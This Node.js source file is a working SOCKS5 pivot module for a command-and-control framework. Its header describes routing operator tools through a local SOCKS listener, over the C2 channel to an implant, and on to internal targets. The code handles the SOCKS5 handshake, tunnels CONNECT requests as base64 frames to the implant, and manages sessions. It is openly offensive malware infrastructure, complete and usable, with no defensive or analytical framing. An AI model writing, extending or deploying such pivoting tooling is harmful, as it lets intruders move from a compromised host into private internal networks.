/**
 * Per-session SOCKS5 proxy: operator tools → local SOCKS → mux over C2 → implant → internal target.
 */
const net = require('net');

const CHUNK = 12 * 1024; // raw bytes per DATA frame (base64 grows ~4/3)

class SocksSession {
  constructor(clientId, agentSocket, opts = {}) {
    this.clientId = clientId;
    this.agentSocket = agentSocket;
    this.port = Number(opts.port) || 0; // 0 = ephemeral
    this.host = opts.host || '127.0.0.1';
    this.server = null;
    this.listenPort = null;
    this.nextId = 1;
    this.tunnels = new Map(); // id -> { socksSocket, opened, buffer[], closed }
    this.closed = false;
  }

  start() {
    return new Promise((resolve, reject) => {
      this.server = net.createServer((sock) => this.onSocksClient(sock));
      this.server.on('error', reject);
      this.server.listen(this.port, this.host, () => {
        const addr = this.server.address();
        this.listenPort = addr.port;
        console.log(`[SOCKS] ${this.clientId.slice(0, 8)} listening ${this.host}:${this.listenPort}`);
        resolve({ host: this.host, port: this.listenPort });
      });
    });
  }

  stop() {
    this.closed = true;
    for (const [id, t] of this.tunnels) {
      this.sendAgent({ type: 'socks_close', id });
      try { t.socksSocket.destroy(); } catch (_) {}
    }
    this.tunnels.clear();
    if (this.server) {
      try { this.server.close(); } catch (_) {}
      this.server = null;
    }
    console.log(`[SOCKS] ${this.clientId.slice(0, 8)} stopped`);
  }

  sendAgent(obj) {
    if (!this.agentSocket || this.agentSocket.destroyed) return;
    try {
      this.agentSocket.write(JSON.stringify(obj) + '\n');
    } catch (e) {
      console.error('[SOCKS] write agent failed:', e.message);
    }
  }

  /** Handle socks_* messages from implant */
  onAgentMessage(msg) {
    const id = Number(msg.id);
    const t = this.tunnels.get(id);
    if (!t) return;

    const typ = String(msg.type || '').toLowerCase();
    if (typ === 'socks_ok') {
      t.opened = true;
      // SOCKS5 success reply
      try {
        t.socksSocket.write(Buffer.from([0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
      } catch (_) {}
      // flush any early client data
      for (const chunk of t.buffer) this.relayToAgent(id, chunk);
      t.buffer = [];
      return;
    }

    if (typ === 'socks_fail') {
      try {
        t.socksSocket.write(Buffer.from([0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0])); // connection refused
      } catch (_) {}
      this.closeTunnel(id);
      return;
    }

    if (typ === 'socks_data' && msg.data) {
      try {
        const buf = Buffer.from(String(msg.data), 'base64');
        if (buf.length) t.socksSocket.write(buf);
      } catch (e) {
        console.error('[SOCKS] decode data:', e.message);
        this.closeTunnel(id);
      }
      return;
    }

    if (typ === 'socks_close') {
      this.closeTunnel(id, false);
    }
  }

  closeTunnel(id, notifyAgent = true) {
    const t = this.tunnels.get(id);
    if (!t) return;
    this.tunnels.delete(id);
    if (notifyAgent) this.sendAgent({ type: 'socks_close', id });
    try { t.socksSocket.destroy(); } catch (_) {}
  }

  relayToAgent(id, buf) {
    if (!buf || !buf.length) return;
    for (let off = 0; off < buf.length; off += CHUNK) {
      const slice = buf.subarray(off, Math.min(off + CHUNK, buf.length));
      this.sendAgent({
        type: 'socks_data',
        id,
        data: slice.toString('base64'),
      });
    }
  }

  onSocksClient(socksSocket) {
    socksSocket.on('error', () => {});
    let stage = 'greeting';
    let buf = Buffer.alloc(0);
    let tunnelId = null;

    const onData = (chunk) => {
      buf = Buffer.concat([buf, chunk]);

      if (stage === 'greeting') {
        if (buf.length < 2) return;
        const ver = buf[0];
        const nmethods = buf[1];
        if (ver !== 0x05) {
          socksSocket.destroy();
          return;
        }
        if (buf.length < 2 + nmethods) return;
        // no-auth
        socksSocket.write(Buffer.from([0x05, 0x00]));
        buf = buf.subarray(2 + nmethods);
        stage = 'request';
        if (!buf.length) return;
      }

      if (stage === 'request') {
        if (buf.length < 4) return;
        const ver = buf[0];
        const cmd = buf[1];
        const atyp = buf[3];
        if (ver !== 0x05 || cmd !== 0x01) {
          // only CONNECT
          socksSocket.write(Buffer.from([0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
          socksSocket.destroy();
          return;
        }

        let host;
        let port;
        let need;

        if (atyp === 0x01) {
          need = 4 + 4 + 2;
          if (buf.length < need) return;
          host = `${buf[4]}.${buf[5]}.${buf[6]}.${buf[7]}`;
          port = buf.readUInt16BE(8);
        } else if (atyp === 0x03) {
          const len = buf[4];
          need = 5 + len + 2;
          if (buf.length < need) return;
          host = buf.subarray(5, 5 + len).toString('utf8');
          port = buf.readUInt16BE(5 + len);
        } else if (atyp === 0x04) {
          // IPv6 — basic support
          need = 4 + 16 + 2;
          if (buf.length < need) return;
          const parts = [];
          for (let i = 0; i < 8; i++) parts.push(buf.readUInt16BE(4 + i * 2).toString(16));
          host = parts.join(':');
          port = buf.readUInt16BE(4 + 16);
        } else {
          socksSocket.write(Buffer.from([0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
          socksSocket.destroy();
          return;
        }

        const rest = buf.subarray(need);
        buf = Buffer.alloc(0);
        stage = 'tunnel';

        tunnelId = this.nextId++;
        const tunnel = {
          socksSocket,
          opened: false,
          buffer: rest.length ? [rest] : [],
          closed: false,
        };
        this.tunnels.set(tunnelId, tunnel);

        socksSocket.removeListener('data', onData);
        socksSocket.on('data', (d) => {
          if (!tunnel.opened) {
            tunnel.buffer.push(d);
            return;
          }
          this.relayToAgent(tunnelId, d);
        });
        socksSocket.on('close', () => this.closeTunnel(tunnelId));
        socksSocket.on('error', () => this.closeTunnel(tunnelId));

        this.sendAgent({
          type: 'socks_open',
          id: tunnelId,
          host,
          port,
        });
      }
    };

    socksSocket.on('data', onData);
  }
}

class SocksManager {
  constructor() {
    this.sessions = new Map(); // clientId -> SocksSession
  }

  async start(clientId, agentSocket, opts = {}) {
    this.stop(clientId);
    const session = new SocksSession(clientId, agentSocket, opts);
    const info = await session.start();
    this.sessions.set(clientId, session);
    return info;
  }

  stop(clientId) {
    const s = this.sessions.get(clientId);
    if (s) {
      s.stop();
      this.sessions.delete(clientId);
    }
  }

  status(clientId) {
    const s = this.sessions.get(clientId);
    if (!s || !s.listenPort) return { active: false };
    return {
      active: true,
      host: s.host,
      port: s.listenPort,
      tunnels: s.tunnels.size,
    };
  }

  onAgentMessage(clientId, msg) {
    const s = this.sessions.get(clientId);
    if (s) s.onAgentMessage(msg);
  }

  stopAll() {
    for (const id of [...this.sessions.keys()]) this.stop(id);
  }
}

module.exports = { SocksManager };
